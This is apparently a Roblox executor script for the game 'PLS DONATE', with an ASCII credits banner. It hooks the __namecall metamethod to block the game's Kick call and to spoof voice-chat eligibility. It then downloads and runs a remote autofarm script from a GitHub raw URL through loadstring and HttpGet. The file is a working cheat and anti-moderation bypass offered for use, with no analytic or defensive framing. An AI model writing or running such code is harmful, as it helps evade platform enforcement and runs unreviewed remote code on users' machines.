          --[[
                This property is protected
        You are not allowed to claim this as your own.
    Removal of initial credits to the authors is prohibited.
    
        ___  _    ____    ___  ____ _  _ ____ ___ ____ 
        |__] |    [__     |  \ |  | |\ | |__|  |  |___ 
        |    |___ ___]    |__/ |__| | \| |  |  |  |___                                

                Original Owner: .gg/plsdonate

]]

if hookmetamethod and typeof(hookmetamethod) == 'function' then
	local oldHook
	oldHook = hookmetamethod(game, "__namecall", function(self, ...)
		if getnamecallmethod() == "Kick" then
			return warn('haha bypassed')
		end
		return oldHook(self, ...)
	end)
end

if hookmetamethod and typeof(hookmetamethod) == 'function' then
	local oldHookS
	oldHookS = hookmetamethod(game, "__namecall", function(self, ...)
		if getnamecallmethod() == "IsVoiceEnabledForUserIdAsync" then
			return true
		end
		return oldHookS(self, ...)
	end)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/old.lua"))()